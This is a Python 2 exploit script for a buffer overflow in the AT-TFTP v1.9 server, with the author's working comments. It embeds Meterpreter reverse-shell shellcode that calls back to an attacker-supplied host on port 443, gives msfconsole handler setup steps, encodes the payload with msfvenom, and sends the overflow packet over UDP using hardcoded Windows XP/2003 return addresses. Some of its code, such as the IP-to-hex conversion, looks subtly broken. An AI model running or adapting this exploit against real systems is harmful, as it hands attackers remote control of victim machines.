#!/usr/bin/python

#AT-TFTP v1.9 Exploit
# python 2.7
import sys, socket, binascii, subprocess, os


## Using meterpreter for initial payload, run this prior to this python file
## sudo msfconsole
## use multi/handler
## set payload windows/meterpreter/reverse_nonx_tcp
## set LHOST <Attacker IP>
## set LPORT 443
## exploit -j

# to run 'python atftp_lfname.py <victim IP> <victim Port> <attacker IP>'

if len(sys.argv) < 4:
    print "python atftp_lfname.py <victim IP> <victim Port> <attacker IP>"
    sys.exit(-1)

host = sys.argv[1]
port = int(sys.argv[2])
lhost = sys.argv[3]
## Convert lhost to hex
lhostSplit=lhost.split('.')
lhostHex = binascii.a2b_hex(lhostSplit[0]) + binascii.a2b_hex(lhostSplit[1]) +binascii.a2b_hex(lhostSplit[2]) +binascii.a2b_hex(lhostSplit[3]) ## LHOST
exploit = ""

ret = "\x53\x93\x42\x7e" # return address for XPSP3, little endian
ret = "\xd3\xfe\x86\x7c" # return address for 2003, little endian
nop = "\x90" * (25-len(lhost)) # calc NOP sled size

## need small payload (<210) but unlike writeup, not a meterpreter shell.  Let's do meterpreter first to validate
## that everything is working and then replace payload.  need to use msfvenom instead of msfpayload.
## the example doesn't account for bad chars, should be using (turns out this is done later)
## should be "msfvenom -p windows/meterpreter/reverse_nonx_tcp -b \x00 LHOST=192.168.1.2 LPORT=443 -f python -o payload.py"
# create payload with "msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.1.2 LPORT=443 -f python -o payload.py"
# this gives us python3 code, so a little change.  LHOST doesn't matter since we are going to change it
# C0 A8 01 02
payload =  ""
payload += "\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b"
payload += "\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea"
payload += "\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01"
payload += "\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b"
payload += "\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9"
payload += "\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64"
payload += "\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08"
payload += "\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54"
payload += "\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53"
payload += "\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9"
payload += "\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68"
payload += lhostHex # CHanged LHOST
payload += "\x66\x68\x01\xbb\x66\x53\x89\xe3\x6a\x10"
payload += "\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53"
payload += "\x57\x53\x66\xb9\xc0\x38\xff\xe6"



## need to stack adjust -3500 from esp
## msf-nasm_shell 
## nasm > sub esp, 0xDAC
## 00000000  81ECAC0D0000      sub esp,0xdac
## tack this onto the frontend of the payload

payload = "\x81\xec\xac\x0d\x00\x00" + payload

## now that we have full payload, need to badchar \x00

## should be able to use something like "echo payload | msfvenom -b '\x00' -a x86 --platform windows -f hex -o /tmp/atftp"
## and capture the result into a file
payFileName = "/tmp/at.pf"
payFile = open(payFileName, "wb")
payFile.write(payload)
payFile.close()

payEncodedName = "/tmp/at.pe"

cmd = "cat " + payFileName +  "| msfvenom -b \'\\x00\' -e x86/shikata_ga_nai -a x86 --platform windows -f hex -o " + payEncodedName 
print "patience, msfvenom is not the fastest tool in the shed."
rv = os.system(cmd)


payEncoded = open(payEncodedName, "rb")
encodedPL = payEncoded.read()
payEncoded.close()
if len(encodedPL)/2 > 210:
    print encodedPL
    print len(encodedPL)

#cleanup files
try:
    os.remove(payEncodedName)
    os.remove(payFileName)
except:
    print "failed to delete files for cleanup"

#let's make the payload encoded
epl = ""
x = 0
while x < len(encodedPL)-1:
    if x > len(encodedPL) - 2:
        x = x+2
        break
    else:
        epl += binascii.a2b_hex(encodedPL[x] +encodedPL[x+1])
        #epl += '\\x' + encodedPL[x] +encodedPL[x+1]
        x = x+2
#epl = 206 *'\x90' + 'AAAA'
ret = '\xfb\x3e\xe0\x77'
exploit = "\x00\x02" + nop + epl + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
#print exploit
## create socket and send

print "Sending payload"
try:
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto(exploit, (host,port))
finally:
    client.close()



